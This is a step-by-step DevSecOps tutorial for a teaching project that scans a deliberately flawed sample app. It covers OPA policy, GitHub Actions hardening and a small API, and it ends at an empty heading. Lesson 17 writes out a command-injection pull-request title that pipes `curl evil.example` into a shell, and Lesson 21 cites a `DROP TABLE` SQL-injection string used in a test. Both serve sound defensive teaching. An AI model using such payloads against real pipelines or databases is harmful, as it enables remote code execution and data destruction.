# Phase 1 lessons: learn DevSecOps by reading the code

Read this top to bottom with the code open next to it. Each lesson names the file
where the idea lives. Nothing here assumes you know the terms already.

## Step 0: see it work (5 minutes)

```
python3 -m bridge scan sample-app --demo
```

(On Windows, use `python` instead of `python3`.) You should see a table of results
and the line `VERDICT: BLOCKED`. Open `out/report.md` and read it. Everything below
explains how that report came to exist.

---

## The story in one paragraph

`sample-app/` is a tiny web app with security mistakes planted on purpose. Four
**scanners** (programs that inspect code for problems) each look for a different kind
of mistake. They all report in different formats, so the **bridge** translates every
report into one common shape, removes duplicates, asks a **policy** whether the result
is acceptable, and then writes reports and answers "pass" or "blocked".

---

## Lesson 0: what is a scanner, and why four?

A scanner is a program that reads your project and flags known mistakes, a bit like a
spell-checker for security. No single scanner covers everything, so teams run several:

| Scanner | Looks for | Planted example in `sample-app/` |
| --- | --- | --- |
| **Gitleaks** | Secrets (passwords, API tokens) left in code | a fake token in `config.py` |
| **Semgrep** | Risky code patterns (called SAST) | SQL injection in `app.py` line 20 |
| **Trivy** | Known-vulnerable libraries and bad infrastructure settings | old libraries in `requirements.txt`, root user in `Dockerfile` |
| **zizmor** | Unsafe CI/CD pipeline files (GitHub Actions workflows) | `sample-app/.github/workflows/build.yml` (see Lesson 17) |

Why each matters:

- **Secret in code:** anyone who can read the code (or its history) can use the secret.
  Fix by revoking it and loading secrets from outside the code.
- **SQL injection:** an attacker types database commands into a web form and your app
  runs them. Fix by passing user input as parameters, never gluing it into the query.
- **Vulnerable library (CVE):** a CVE is a numbered public record of a known flaw, for
  example `CVE-2018-18074`. You did not write the bug, but you ship it. Fix by upgrading.
- **Running as root in a container:** if an attacker breaks into the app, they get
  maximum power inside the container. Fix by adding a non-root `USER`.

## Lesson 1: one common shape (`bridge/models.py`)

Gitleaks calls the file `File`, Semgrep calls it `path`, Trivy calls it `Target`.
You cannot rank or compare things that are described differently. So we define one
`Finding` shape and convert everything into it. Every later step (policy, reports,
the future dashboard) only knows `Finding`.

> Analogy: three people measure in inches, centimetres and hand-spans. Before comparing,
> everyone converts to centimetres.

**Try it:** open `models.py` and find the five fields that every finding must have.

## Lesson 2: adapters are the "bridge" (`bridge/adapters.py`)

One small function per scanner: raw output in, `Finding` list out. This is the whole
trick behind connecting many tools. To support a fourth scanner later, you write one
more function here and change nothing else.

**Try it:** read `parse_gitleaks`. It is about 15 lines. Notice it never touches policy
or reports.

## Lesson 3: severity is a decision, not a fact (`adapters.py`)

Trivy says `HIGH`, Semgrep says `ERROR`, Gitleaks says nothing. We chose a mapping:
leaked secrets count as `high`, Semgrep `ERROR` becomes `high`, `WARNING` becomes
`medium`. These choices are visible in plain tables at the top of each adapter,
because teams will argue about them and need to change them.

**Try it:** change Semgrep `WARNING` to map to `high`, run the demo, and watch the
`debug enabled` finding start blocking. Undo it afterwards.

## Lesson 4: duplicates destroy trust (`models.py`, `runner.py`)

If two tools report the same leaked password, the team sees two alarms for one problem.
Teams that see noisy reports stop reading them. `deduplicate` merges findings that share
a `dedupe_key` and keeps the more severe one. This is a small taste of what commercial
ASPM tools do at large scale. **Read Lesson 15 too:** the first version of this merged
too eagerly and hid a real finding.

## Lesson 5: never copy a secret into a report (`adapters.py`)

Gitleaks output includes the leaked value itself. Our adapter deliberately drops it.
Reports get pasted into tickets and uploaded to dashboards; copying the secret would
create a new leak. A test (`test_bridge.py`) searches every report file for the token
and fails if it appears.

## Lesson 6: fail soft, but never fake a clean result (`runner.py`)

If a scanner is missing or crashes, the bridge keeps going with the others, but it
records a status (`ok`, `skipped`, `failed`, `demo`) and prints a warning in the report.
If no scanner runs at all, it refuses to produce a report (exit code 2) instead of
saying "all clear". A security tool that silently skips checks is dangerous, because
people trust the green tick.

## Lesson 7: policy is data (`policy.json`, `bridge/policy.py`)

The rules live in a JSON file:

```
"block_at": { "secret": "low", "code": "high", "dependency": "high", "config": "high" }
```

Read it as: any secret blocks, but code and library problems only block at `high` or
above. Security people can change the rules without reading Python. Large companies
do the same with a policy language (OPA, which you will meet in phase 2). **Policy as
code** means the rules are written down, versioned and reviewed, not kept in someone's head.

**Try it:** change `"code": "high"` to `"code": "medium"` and re-run. The `debug enabled`
finding now blocks.

## Lesson 8: waivers need an expiry date (`policy.json`, `policy.py`)

Sometimes you cannot fix something today. A **waiver** records "we accept this for
now, here is why, and we will revisit by this date". Without expiry dates, waivers
pile up and become permanent holes. In this project an expired waiver simply stops
working, and the report lists it so someone notices.

**Try it:** the example waiver expires on 2026-12-31. Change it to a past date and
watch `CVE-2018-1000656` start blocking again, with an "Expired waivers" section in
the report.

## Lesson 9: SARIF, the shared language (`bridge/report.py`)

SARIF is an open standard format for scanner results. We export one `report.sarif`
file. Platforms like GitHub can display SARIF directly in their Security tab, so
writing it once gives you a polished viewer for free (that is phase 3 of the plan).
We produce three reports for three audiences: `report.md` for people, `report.json`
for programs (a dashboard later), `report.sarif` for security platforms.

## Lesson 10: exit codes are how pipelines make decisions (`bridge/cli.py`)

A CI/CD pipeline (the automatic assembly line that builds and ships your code) cannot
read a report. It only checks one number when a program ends: `0` means success,
anything else means failure. Our bridge returns:

- `0` passed
- `1` blocked by policy, so the pipeline stops and nothing ships
- `2` could not do its job

Check it yourself: run the scan, then type `echo $?` (macOS/Linux) or `echo %errorlevel%`
(Windows Command Prompt). In phase 3, GitHub Actions will use exactly this number to stop
a bad pull request.

## Lesson 11: tests protect the trust (`tests/test_bridge.py`)

```
python3 -m unittest discover -s tests -v
```

The tests pin down the behaviours that matter most: severity mapping, dedupe, policy,
waivers, "secret never leaks", and "no scanners means no fake pass". There is also a test
that every sample finding points at a real file and line in `sample-app/`, so the
demo cannot drift away from the app it claims to scan.

## Lesson 12: the layers (`bridge/layers.py`)

Software does not jump from a developer to users. It travels through a chain, and each
link can break in its own way:

```
1 Source code -> 2 Dependencies -> 3 CI/CD pipeline -> 4 Container image
              -> 5 Infrastructure as code -> 6 Kubernetes -> 7 Running system
```

| Layer | What lives there | Planted flaw in `sample-app/` |
| --- | --- | --- |
| Source code | what developers write, and secrets left in it | SQL injection, fake token |
| Dependencies | third-party libraries | old Flask, PyYAML, Jinja2, requests |
| CI/CD pipeline | the automatic build-and-ship line | four planted flaws in `build.yml` (Lesson 17) |
| Container image | the packaged app (Docker) | runs as root |
| Infrastructure as code | servers and cloud described in files (Terraform) | SSH open to the internet (`infra/main.tf`) |
| Kubernetes | the system that runs many containers | privileged container (`k8s/deployment.yaml`) |
| Running system | the live app | none yet (needs live-testing tools) |

Why layers matter: each layer has a different owner and a different fix. A vulnerable
library is fixed by a developer upgrading a version; an open SSH port is fixed by whoever
manages the cloud. Saying "11 problems" is noise. Saying "layers 1, 2, 4, 5 and 6 are
broken, start at layer 1" tells people who must act.

How it works: after the scanners run, `classify()` gives every finding a layer using
simple, visible rules (a secret or code finding is source code; a library finding is
dependencies; a config finding is decided by the file, so `Dockerfile` is container,
`.tf` is infrastructure, a YAML file with `apiVersion` and `kind` is Kubernetes).
`summarize()` then produces one row per layer, in stack order.

**Why "start at the earliest broken layer":** problems travel downstream. A vulnerable
library in layer 2 ends up inside the container in layer 4. Fixing upstream often fixes
several things below it. This is a rule of thumb, not a proof, and the report says so.

**Try it:** run the demo and read the "Layers" section of `out/report.md`. Then delete
the `"CVE-..."` entries from `fixtures/trivy.json` that belong to dependencies and
re-run. The Dependencies row should change.

## Lesson 13: "clean" needs proof (`bridge/layers.py`)

A layer with zero findings is only **clean** if some scanner really looked at it. One
layer in our stack (Running system) has no scanner yet, so the report says **not
scanned**, never "clean". The same rule applies to a scanner that is missing: if Trivy is
not installed, the container layer drops from "clean" to "not scanned" automatically, and
if a project has no `.github/workflows` folder, zizmor has nothing to check and the
pipeline layer shows "not scanned" too. A green tick for something nobody inspected is
how real breaches hide, so the bridge refuses to hand one out.

This also gives you a built-in roadmap: each "not scanned" row is a feature to build.
(The pipeline layer used to be one; Lesson 17 closed it. Runtime testing for layer 7 is
still open.)

**Limits to know about:** our scanners can only see what is in the files you point them
at. The Kubernetes layer here means manifest files in the repo, not a live cluster, and
the container layer means the Dockerfile, not a built image. Scanning the live cluster
and built images comes later.

## Lesson 14: the pipeline (`.github/workflows/securebridge.yml`)

Until now you ran the bridge by hand, so it only worked when you remembered. A **pipeline**
runs it for you, automatically, on every change. GitHub's pipeline tool is called
**GitHub Actions**, and it is configured with a YAML file inside `.github/workflows/`.
Read the workflow file top to bottom with this lesson beside it.

**The skeleton**

- `on:` says when it runs: on every push to `main`, on every pull request (a proposed
  change waiting for review), and by hand from the Actions tab (`workflow_dispatch`).
- `jobs:` are groups of steps, each running on a fresh temporary Linux machine
  (`runs-on: ubuntu-latest`). Nothing from one job carries into the next, which is why
  the scan job installs its own scanners.
- `needs: test` makes the scan wait for the test job. If the engine itself is broken,
  there is no point trusting its verdict.
- `uses:` borrows a ready-made step someone else wrote, such as `actions/checkout@v4`,
  which downloads your code onto the machine.

**Where Lesson 10 pays off.** The step `python -m bridge scan ...` returns exit code 1
when the policy blocks. GitHub sees a failed step, the job turns red, and the pull
request shows a red cross. Nobody has to read anything for the system to say "stop".
That one number is the whole mechanism.

**Choices worth understanding**

1. **Least privilege.** The workflow starts with `permissions: contents: read`, meaning it
   can only read your repo. Only the scan job gets the extra `security-events: write`,
   and only because uploading to the Security tab needs it. If any step were ever
   hijacked, it could do much less damage. Security tools should hold the minimum power.
2. **`if: always()`.** A normal step is skipped once an earlier step fails. But the failure
   is exactly when you most want the report, so the publishing steps use `always()`.
   The scan step itself has no `always()` and no `continue-on-error`, because that would
   swallow the failure and nothing would ever be blocked. A test enforces this.
3. **Versions: latest first, then pin.** `GITLEAKS_VERSION` and `TRIVY_VERSION` start
   empty, meaning "newest release", and the "Show scanner versions" step prints what was
   actually used. Once a run is green, copy those numbers into the two variables. Pinning
   matters because if a scanner updated overnight and changed its output, your pipeline
   could start failing (or worse, passing) for no visible reason. Pinning makes changes
   deliberate; the trade-off is that you bump them yourself now and then.

   *What went wrong the first time (a real lesson):* the first version of this workflow
   downloaded scanners from hand-built URLs with guessed version numbers. GitHub answered
   "not found", `curl -f` exited with code 22, and the job turned red *before any scan ran*.
   A red run can mean "the tool found problems" or "the tool never ran", and you must tell
   them apart by opening the failed step. The install step now uses the GitHub CLI to pick
   the file by name pattern, and if that fails it prints the real file names in the release.
4. **Run summary.** The report is appended to `$GITHUB_STEP_SUMMARY`, so the layer table
   appears on the run's page without opening any file.
5. **SARIF upload.** Lesson 9 pays off here: `upload-sarif` sends `report.sarif` to the
   repository's **Security** tab (Code scanning), where findings show up per file and line.
   Paths there must be relative to the repo root, so the CLI adds the scanned folder as a
   prefix (`sample-app/config.py`, not `config.py`).
6. **Report download.** `upload-artifact` keeps `out/` as a downloadable zip on the run.

**What a pipeline cannot do alone: branch protection.** A red cross is only a warning
until you tell GitHub to enforce it. In the repo's Settings, add a branch protection
rule (or ruleset) for `main` that **requires the `scan` check to pass before merging**.
Without that, someone can merge a blocked pull request anyway.

**Things I could not test from here (be honest with yourself about these)**

- The workflow has never run on GitHub. It is validated as YAML, its safety properties are
  pinned by tests, and the scan step was simulated locally, but the first real run may
  hit a snag. Read the failing step's log; it usually says exactly what is wrong.
- The file-name patterns in "Install the scanners" (`*linux_x64.tar.gz` for Gitleaks,
  `*Linux-64bit.tar.gz` for Trivy) are based on those projects' usual naming and were only
  tested against a stand-in for the GitHub CLI. If the step fails, its log lists the real
  file names, and you only need to adjust the pattern.
- Semgrep's `--config auto` downloads rules from the internet while it runs. That works
  on GitHub's machines, and would not work on a locked-down network.
- Uploading to the Security tab is free on public repositories. On private repositories
  it needs GitHub's paid code scanning; the step is marked `continue-on-error` so it never
  hides the real verdict, and the report is still in the run summary and the download.

**Try it** (see README, "Run it on GitHub"): push the project, open the Actions tab and
watch the run. It should turn red, because the sample app is broken on purpose. Then
change the policy so everything passes (or fix the flaws) and watch it turn green.

## Lesson 15: real output found bugs my samples could not

The first GitHub run used the real scanners, and its report exposed three problems.
This is the most valuable lesson in the project, because it is how real tools get built.

**1. A finding vanished (dedupe was too eager).** The real Trivy run reports many
Kubernetes problems. The first version of `dedupe_key` was "category + file + line", so
two different rules on the same line looked like one problem, and the planted
*privileged container* finding was silently dropped. The report even said "21 duplicates
merged", which sounded tidy and hid the damage. The fix: only merge what is provably the
same (a secret at the same place, the same CVE in the same package, an exact repeat of
one rule). Two regression tests now pin this down.

> General rule: in a security tool, wrongly merging is worse than wrongly keeping. A
> noisy report is annoying; a report that hides a real problem is dangerous.

**2. Findings were filed under the wrong layer.** Semgrep also inspects Dockerfiles and
Kubernetes files, and my layer rules put every Semgrep finding under "Source code". The
real report listed a Dockerfile finding and three Kubernetes findings there. The fix:
look at the *file* first. A test covers each case. Note this is why one tool can span
several layers, and why layers are decided by the bridge, not by the tool.

**3. An open question: Gitleaks reported 0 findings**, but the sample app contains a fake
token (`ghp_...` in `config.py`). Possible reasons, to check one by one:

- The token line in your copy of `config.py` was changed or removed (for example to get
  past GitHub's push protection). Open the file in your repo and look.
- This Gitleaks version's rules or allowlist treat the made-up token as not worth
  reporting. A made-up token can look "too fake" to a smart rule.
- A real command-line problem in `bridge/runner.py`.

Lesson 16 adds a self-test that tells the first two causes from the third automatically.

**Why demo mode could not show any of this:** the saved sample outputs only contained
what I expected to see. Test against the real thing as early as you can.

## Lesson 16: the canary (`gitleaks_self_test` in `bridge/runner.py`)

A scanner that says "0 findings" looks exactly like a scanner that is broken, and that is
the most dangerous failure there is: everyone sees a green result and relaxes. A **canary**
(named after the bird miners carried to detect gas) is a known problem planted on
purpose. Every time Gitleaks runs, the bridge also writes a temporary folder with a made-up
token, runs the *same command* on it, and checks that Gitleaks finds it.

| Self-test | Real scan | What it means |
| --- | --- | --- |
| passes | 0 findings | trustworthy: Gitleaks works and your folder has no secret it recognises |
| passes | finds something | normal |
| fails | anything | the Gitleaks run cannot be trusted: marked `failed` in the report, with its findings still shown |

For our mystery: if the report says "self-test passed" and still 0 findings, Gitleaks
works and the sample token was either changed in your copy or considered too fake to flag
(the canary token is deliberately random-looking, the sample one is a visible pattern). If
the self-test fails, the command or Gitleaks version is the problem.

Two honest limits: the canary proves Gitleaks can find *one kind* of secret, not that it
catches every kind; and it only covers Gitleaks. Semgrep and Trivy could silently go quiet
too, and a canary for each is a sensible later addition.

---

## Lesson 17: the pipeline is a target too (`zizmor`, layer 3)

**Why attackers love pipelines.** Your pipeline holds the keys: it can read your code,
use your secrets, and publish what your customers install. Break into a pipeline and you
do not need to break into the app. Two real examples:

- **SolarWinds (2020):** attackers got into the *build system* and slipped malicious code
  into an official software update, which was then delivered to thousands of customers.
- **tj-actions/changed-files (March 2025):** a popular GitHub Action was tampered with so
  that, as publicly reported, thousands of repositories that used it leaked their secrets
  into their build logs. Repositories that referred to a fixed, full commit were not hit.

So the pipeline file deserves the same scrutiny as application code. **zizmor** is a
scanner built for GitHub Actions workflow files. `sample-app/.github/workflows/build.yml`
contains four planted mistakes (it is a *specimen*: it sits inside `sample-app/`, so
GitHub never runs it, and the real pipeline at the repo root stays safe).

**Quick vocabulary first.** A **trigger** (`on:`) says what starts the workflow. A
**runner** is the temporary machine that runs it. **`GITHUB_TOKEN`** is a password GitHub
creates for each run so the workflow can talk to your repository; its power is set by
`permissions:`. **Secrets** are stored passwords the workflow can use.

**The four planted flaws**

1. **`on: pull_request_target` (rule `dangerous-triggers`).** A normal pull-request trigger
   runs with *no secrets*, because the code comes from outsiders. This special trigger runs
   in the context of *your* repository, with your secrets and write access, even when the
   pull request comes from a stranger's fork. It is safe only if the workflow never runs
   the stranger's code, and the specimen does exactly that (it checks out the pull
   request's code). Safer: use `pull_request`.
2. **`permissions: write-all` (rule `excessive-permissions`).** This hands the run's token
   every permission. If anything in the job is hijacked, the attacker inherits all of it.
   This is *least privilege* again (Lesson 14): start from `contents: read` and add only
   what a job truly needs.
3. **`uses: actions/checkout@main` (rule `unpinned-uses`).** `@main` means "whatever the
   latest code on the main branch is today". If that code changes, or is tampered with, your
   pipeline runs the new version without you ever approving it. The tj-actions incident
   worked like this. Safer: pin to a full commit hash (40 characters) and note the version
   in a comment, because a hash cannot be quietly moved. The same line also triggers
   `artipacked`: checkout leaves your token on disk, which can leak if the folder is later
   uploaded as an artifact. Fix: `persist-credentials: false`.
4. **`run: echo "... ${{ github.event.pull_request.title }}"` (rule `template-injection`).**
   GitHub swaps `${{ ... }}` for its value *before* the shell runs. So if a pull request
   is titled `"; curl evil.example | sh; echo "`, the shell runs that as a command. This is
   *injection*, the same family as the SQL injection in `app.py` (Lesson 0): untrusted text
   becomes code. Fix: pass the value through an environment variable
   (`env: TITLE: ${{ ... }}`) and use `"$TITLE"` in the script, so it stays plain text.

**How the bridge handles it.** `parse_zizmor` in `bridge/adapters.py` turns zizmor's list
into the same `Finding` shape as everything else, so these now appear in the layer table as
**CI/CD pipeline** with the same blocking policy. Notice how little code that took: this is
Lesson 2 paying off. Details worth knowing:

- zizmor counts lines from 0, and the adapter adds 1 (a test pins this).
- zizmor uses its own exit codes: 0 is clean, 11 to 14 mean "found something" (by severity),
  and 1 means it failed. The bridge passes `--no-exit-codes` and also accepts 11 to 14, so
  "found something" is never mistaken for "broke".
- `--offline` makes zizmor skip checks that need internet and a GitHub token (for example
  checking whether an action version has a published vulnerability). That gives identical
  results everywhere but misses those checks, a trade-off you can revisit.
- If the scanned folder has no `.github/workflows`, zizmor is **skipped**, not "clean"
  (Lesson 13).

**Try it:** fix `build.yml` one flaw at a time (change `write-all` to `contents: read`,
pin the checkout to a version tag such as `@v4`), re-run the real scan, and watch the
pipeline row shrink. Also set `SCAN_PATH: "."` in the workflow: the bridge will then scan
**its own pipeline file**, which is a satisfying (and humbling) test.

**Honest limits:** the zizmor sample output in `fixtures/` is hand-written from its
documentation, so the real tool may word things differently. zizmor only understands
GitHub Actions; GitLab CI, Jenkins and others need other tools. And a scanner reads the
file, not the repository settings, so things like "can anyone approve their own pull
request?" are invisible to it.

---

## Lesson 18: the map, DevOps and what DevSecOps adds at each layer

Everything so far in one table. Read it left to right: the DevOps practice, how it goes
wrong, what DevSecOps adds, and which tool in this project does that job.

| Layer | DevOps practice | How it goes wrong | DevSecOps addition | In this project |
| --- | --- | --- | --- | --- |
| 1. Source code | Developers commit to Git, others review | Secrets committed, injection bugs | Secret scanning, SAST, review rules | Gitleaks, Semgrep |
| 2. Dependencies | Reuse open-source libraries | A library you never wrote has a known flaw | Software composition analysis, SBOM, auto-update bots | Trivy (Renovate later) |
| 3. CI/CD pipeline | Automatic build, test, deploy | Pipeline hijacked, over-trusted, secrets leaked | Least-privilege tokens, pinned actions, pipeline scanning | zizmor, the workflow itself |
| 4. Container image | Package the app so it runs anywhere | Runs as root, bloated, old base image | Image scanning, non-root users, signed images | Trivy (Cosign later) |
| 5. Infrastructure as code | Servers and cloud defined in files | Open ports, public storage | Policy checks before anything is created | Trivy (OPA later) |
| 6. Kubernetes | Orchestrate many containers | Privileged pods, no limits, default settings | Admission policies, pod security rules | Trivy (Kyverno later) |
| 7. Running system | Monitor and operate production | Attacks and drift nobody sees | Runtime detection, live testing, alerting | not yet |

Three ideas run through every row:

- **Shift left.** Find problems as early in the chain as you can, because fixing a leaked
  secret in layer 1 costs minutes while fixing it after a breach costs weeks. The layer
  order in the report *is* the left-to-right order.
- **Automate the check, not just the build.** DevOps automated building and shipping.
  DevSecOps adds automated *judgement* at each step: a pass/block decision no one has to
  remember to make. That is the job of the policy and the exit code.
- **Everything as code.** Pipeline, infrastructure and now the rules (`policy.json`) are
  files in Git, so they are reviewed, versioned and testable. This is the idea behind
  "policy as code", coming in phase 2b with OPA.

### Check yourself (answers below)

1. A scanner finds a secret in `config.py` and another finds an open SSH port in
   `main.tf`. Which layers are those, and why might different people fix them?
2. Why does the report say "not scanned" instead of "clean" for the running system?
3. `permissions: write-all` is dangerous even when nothing is wrong today. Why?
4. Why can pinning an action to a full commit protect you from the tj-actions kind of attack,
   while `@v4` or `@main` cannot?
5. What would happen if the bridge treated zizmor's exit code 13 as "the tool crashed"?
6. Why was merging "same file and same line" findings a bug (Lesson 15)?

<details>
<summary>Answers</summary>

1. Source code (layer 1) and Infrastructure as code (layer 5). A developer fixes the
   secret; whoever manages the cloud fixes the port. The layer tells you who to ask.
2. Because no tool inspects it. A "clean" would mean "checked and fine", which would be
   false. Silence is not safety.
3. Least privilege: permissions are about what an attacker could do *if* something else
   goes wrong. Broad rights turn a small break-in into a total one.
4. A tag or branch can be moved to different code after you trusted it; a full commit hash
   identifies exactly one version of the code and cannot be quietly changed.
5. Every run that found anything would be reported as a tool failure, so real findings
   would be hidden behind "failed" and people would stop trusting the report.
6. Two different problems on the same line were treated as one, so a real finding (a
   privileged container) disappeared from the report. Wrongly merging hides risk.

</details>

---

## Lesson 19: policy as code (OPA and Rego), and how to change rules safely

**The problem.** `policy.json` holds the *settings* ("block secrets at low, code at high"), but the *logic* that applies them lives in Python. At a big company, the people who own security rules (the security team) are not the people who write the engine. They want rules in a small, reviewable, testable language that many tools can share: the CI pipeline, Kubernetes admission, Terraform checks. That is **policy as code**.

**OPA** (Open Policy Agent) is the standard engine for it. You give it three things: *data* (our policy settings), *input* (the findings), and a *policy* written in **Rego**. It answers a question, here `data.securebridge.decision`.

### Rego, line by line (`policy/securebridge.rego`)

- `package securebridge` and `import rego.v1`: the namespace, and the modern Rego syntax. Always include the import.
- `severities := [...]` and `rank(severity)`: the position in the list is the rank, so `high` outranks `medium`. `some i, s in severities` means "find an index and value pair"; the rule yields `i` for the match.
- `limit(finding)`: look up the blocking threshold for this finding's category; fall back to `default`.
- `applies(finding)`: true when the threshold is not `"never"` and the finding's rank is at or above it.
- `covers(waiver, finding)` is defined **twice**. In Rego, several definitions of the same rule act as an **OR**: a waiver covers a finding if it names no file, or if it names this finding's file.
- `waived_idx contains i if {...}`: builds a *set* of finding positions that an unexpired waiver excuses. Every line inside the braces must be true (an **AND**). Dates like `2026-12-31` compare correctly as plain text.
- `blocking_idx`: findings that reach the threshold and are *not* waived.
- `invalid_idx`: findings whose severity is unknown. This exists because of the biggest Rego trap below.
- `decision := {...}`: the one object the bridge reads.

### The trap: undefined is not false

In Python a failed comparison is `False`. In Rego, if any line in a rule cannot be satisfied, the whole rule is **undefined**, and undefined quietly produces *nothing*. For a security policy, "nothing" can mean "nothing blocks". A finding with a typo severity such as `"hgih"` would make `rank()` undefined, never match the threshold, and sail through. So we count such findings separately, and the shadow check treats `invalid > 0` as a disagreement. Remember this for any policy language: **decide what happens on bad input, deliberately**.

### Testing policy

`policy/securebridge_test.rego` has 10 tests. Each one is a rule starting with `test_` that feeds fake input with `with input as {...}` and asserts the decision. Run them with `opa test policy/ -v`. `opa check policy/` catches syntax mistakes. Policies that decide whether production ships deserve tests exactly as much as application code does.

### Shadow mode: how you change rules safely

We do not switch the pipeline from Python to Rego in one jump. With `--policy-engine shadow`:

1. Python still decides the exit code (nothing changes for developers).
2. OPA decides too, on the same findings.
3. The report prints **agree / disagree / skipped / error**.
4. When it has said "agree" on many real runs, including runs with waivers and edge cases, we make OPA the enforcer.

Big companies do this with every risky change: *shadow, then warn, then enforce*. Kubernetes policy tools like Kyverno and Gatekeeper have a literal "audit" mode for it.

### Honest limits

I could not install OPA in my workspace, so the Rego was **never run here**. Python-side tests (69) pass, including a stub `opa`, but the first real `opa check` and `opa test` will happen in your GitHub run, in the `policy` job. If it fails, that is normal: paste me the output and we fix it. That is the same loop as the gitleaks and exit-22 fixes.

### Check yourself

1. Why do we keep `policy.json` if the rules move to Rego?
2. What does it mean that `covers` is defined twice?
3. Why is "undefined" dangerous in a security policy?
4. What is the point of shadow mode?
5. Name two other places where OPA-style policy is used.

**Answers.**
1. It is the *settings* (data); Rego is the *logic*. Settings change often and by non-programmers, logic changes rarely and is code-reviewed.
2. Multiple definitions are OR: either one being true makes the rule true.
3. A rule that cannot be evaluated returns nothing instead of false, so a bad input can silently let things pass. You must handle invalid input explicitly.
4. To compare the new engine with the old one on real data without risk, and only enforce once they agree.
5. Kubernetes admission control (Gatekeeper), Terraform plan checks (conftest), API authorization, and CI gates like this one.

## Lesson 20: pinning, proving the gate both ways, and failing closed

Three small habits that separate a demo from something a team can trust.

### 1. Pinning (repeatable builds)

Until now the workflow downloaded the **latest** scanners every run. That is convenient and dangerous: a new Trivy release can add rules, change output or break parsing, and your pipeline turns red on a day when *you* changed nothing. **Pinning** means writing down the exact version (`TRIVY_VERSION: "0.xx.x"`) so every run uses the same tool. The run summary now ends with a **Versions to pin** block: copy its three lines into the `env:` section of the workflow. Pinning also protects against **supply-chain attacks** (Lesson 17): a hijacked "latest" cannot reach you until you choose to upgrade. The price: you must upgrade on purpose. Tools like Renovate and Dependabot send automatic pull requests for that, so the decision stays visible.

### 2. Red-to-green: prove the gate works both ways

A gate that has only ever said "blocked" is not proven. Maybe it blocks *everything*. `sample-app-fixed/` is the same app with all 12 flaws repaired (each fix is commented `FIX n`). Start the workflow by hand (Actions tab, **Run workflow**) and choose `sample-app-fixed`. A good result is **PASSED** with exit code 0. The same idea is a **positive and negative test**: you need both a case that must fail and a case that must pass. Whatever the fixed app still gets flagged for is also useful: either a real remaining issue or a rule that is too noisy, and each is worth knowing.

Honest caveat: I could not run the real scanners here. The fixed dependency versions and the pinned `actions/checkout` commit are my best knowledge, so if the run still flags something, paste it to me and we fix it together.

### 3. OPA now decides, and fails closed

With `--policy-engine opa`, the Rego rules make the pass/block call. Python still computes its answer, and any disagreement is printed loudly, but OPA wins. The important design choice: **if OPA cannot answer** (not installed, crash, undefined result), the scan exits **2**, not 0. That is called **failing closed**. The opposite, failing open, means a broken checker lets everything through, which is the worst possible failure for a security gate. (Compare a fire door: it is designed to stay shut when the power fails.)

Why switch only now? Shadow mode showed OPA and Python agreed on your real run. For extra safety, keep an eye on the "Policy check" section for a few runs: if it ever says DISAGREE, one engine has a bug.

### Check yourself

1. What can go wrong with "latest" versions, and what is the cost of pinning?
2. Why test with a clean project as well as a broken one?
3. What does "fail closed" mean and why is exit code 2 used for it?
4. In enforcing mode OPA and Python disagree. Who wins, and what should you do?

**Answers.**
1. New releases can change results or break parsing without you touching anything, and a hijacked release reaches you instantly. Pinning costs you manual (or bot-driven) upgrades.
2. To prove the gate can say "pass" as well as "block"; otherwise it might just block everything.
3. When the checker itself fails, the safe default is to stop, not to approve. Exit 2 means "could not decide", which is different from "found problems" (1) and "all clear" (0).
4. OPA wins. You treat the disagreement as a bug report: work out which engine implements the rule wrongly and fix it.

## Lesson 21: phase 3, giving SecureBridge a memory (database, API, multi-tenancy)

Until now every run produced a report and forgot it. A product needs **history**: "is it getting better?", "what is new since last time?". That means three new pieces, all in the standard library, so nothing to install.

### The pieces

- **Database** (`bridge/store.py`, SQLite). Four ideas:
  - *Tables*: `projects`, `scans` (one row per run) and `findings` (one row per problem in a scan). A **foreign key** such as `scan_id` links a finding to its scan, like a page number pointing to a chapter.
  - *Fingerprint*: each finding gets a short id built from the same key as dedupe (Lesson 4/15). The same problem found again next week has the same fingerprint, so comparing two scans' fingerprints tells you **new** and **fixed**.
  - *Index*: a lookup shortcut (`idx_scans_project`), like a book's index; without it every query would read the whole table.
  - *Parameterized queries*: every SQL statement uses `?` placeholders instead of pasting text in. This is the exact fix for the SQL-injection flaw planted in `sample-app/app.py`. A test even stores `'); DROP TABLE scans;--` as a title to show it stays plain text.
- **API** (`bridge/server.py`). Other programs cannot open your database file, so they send HTTP requests. `POST /api/v1/scans` uploads a report, and `GET /api/v1/scans`, `/scans/<id>` and `/trend` read it back as JSON. `/v1/` in the path lets you change the API later without breaking old clients.
- **Upload** (`--upload-url` and `--token`, or the environment variables `SECUREBRIDGE_URL` and `SECUREBRIDGE_TOKEN`). The CLI sends the finished report after scanning.

### Multi-tenancy: the SaaS-critical idea

A SaaS serves many customers from one database. Every row carries a `project_id`, and **every** query filters by it. Forgetting one filter is how real products leak one customer's data to another. So: (1) the project comes from the **token**, never from something the caller types; (2) asking for another project's scan returns **404**, the same as for a scan that doesn't exist, so an attacker cannot even learn which ids exist; (3) tests check all of it.

### Tokens: store the lock, not the key

The API token is shown once when you run `create-project`. The database keeps only a **SHA-256 hash** of it. If the database file leaks, the attacker gets hashes, which cannot be turned back into tokens. The same reason websites store password hashes. (Tokens are long and random, so a plain fast hash is acceptable here. For human-chosen passwords you would use a slow one such as bcrypt or argon2.)

### Never trust uploaded data

The server **validates** every report: the verdict must be passed/blocked, every finding needs its fields, and an unknown severity such as `hgih` is rejected with HTTP 422. Why? Everything stored is later trusted by charts, alerts and billing. This is the same lesson as Rego's undefined trap (Lesson 19): bad data must fail loudly at the door. Request size is capped (5 MB, HTTP 413), and wrong or missing tokens get 401.

HTTP status codes in use: 200 OK, 201 Created, 400 you sent nonsense, 401 who are you?, 404 not found, 413 too big, 422 well-formed but not acceptable.

### Design choice: upload never changes the verdict

If the API is down, the scan still passes or blocks as before, because a security gate must not depend on a dashboard. The upload prints a warning and moves on. (Compare Lesson 20: the policy engine fails **closed**; a reporting service fails **open**. Match the failure mode to how critical the part is.)

### Try it yourself

```
python -m bridge.server create-project my-team     # prints a token once
python -m bridge.server serve --port 8080          # leave running
export SECUREBRIDGE_TOKEN=sb_...                   # in another terminal
python -m bridge scan sample-app --demo --upload-url http://127.0.0.1:8080
python -m bridge scan sample-app-fixed --demo --upload-url http://127.0.0.1:8080
curl -H "Authorization: Bearer $SECUREBRIDGE_TOKEN" http://127.0.0.1:8080/api/v1/trend
```

### Honest limits

